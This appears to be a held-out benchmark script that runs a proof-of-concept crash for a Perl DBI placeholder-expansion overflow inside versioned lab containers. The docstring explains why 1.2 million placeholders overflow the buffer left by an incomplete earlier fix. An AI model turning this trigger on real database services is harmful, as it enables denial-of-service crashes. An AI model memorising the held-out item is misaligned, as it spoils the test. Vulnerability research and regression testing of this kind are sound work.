#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-14739 residual exploit for dbi-cve-2026-14739.

Same sink, larger payload: N=1,200,000 '?' placeholders. The CVE-2026-10879
fix (DBI 1.648/1.649) only raised the allocation factor from 3 to 6, which
covers ':p1'..':p11106'; for ~1.2M placeholders the ':p<idx>' expansion
(~10.4MB) still overflows the strlen*6+16 buffer (~7.2MB) and the probe
process dies with SIGABRT/SIGSEGV. DBI 1.650 (CVE-2026-14739 fix) adds a
hard limit of 99,999 placeholders (plus a strlen*7 factor), so the same probe
fails cleanly with a DBI error and exits 0.
"""
import argparse
import subprocess

CONTAINERS = {"v0": "pcb-dbi-v0", "v1": "pcb-dbi-v1", "v2": "pcb-dbi-v2"}
RESIDUAL_N = 1_200_000


def run_probe(version: str, n: int) -> dict:
    r = subprocess.run(
        ["docker", "exec", CONTAINERS[version], "perl", "/app/probe.pl", str(n)],
        capture_output=True, text=True, timeout=180,
    )
    return {
        "exit_code": r.returncode,
        "crashed": r.returncode >= 128,
        "stdout": r.stdout.strip()[:200],
        "stderr": r.stderr.strip()[:200],
    }


def candidate(*, version="v1", flag=None):
    res = run_probe(version, RESIDUAL_N)
    return {"ok": res["crashed"], "crashed": res["crashed"], "result": res}


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("version", nargs="?", default="v1")
    a = ap.parse_args()
    print(candidate(version=a.version))
